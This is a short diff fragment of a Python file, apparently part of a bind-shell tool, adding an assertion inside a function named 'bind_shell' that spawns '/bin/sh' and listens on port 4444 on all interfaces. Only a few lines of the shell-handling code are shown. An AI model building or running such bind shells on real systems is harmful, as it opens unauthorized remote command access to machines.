@@ -46,6 +46,7 @@ def bind_shell(host: str = "0.0.0.0", port: int = 4444, shell: str = "/bin/sh") 
         stdout=subprocess.PIPE,
         stderr=subprocess.PIPE,
     )
+    assert process.stdin is not None and process.stdout is not None
 
     try:
         while True:
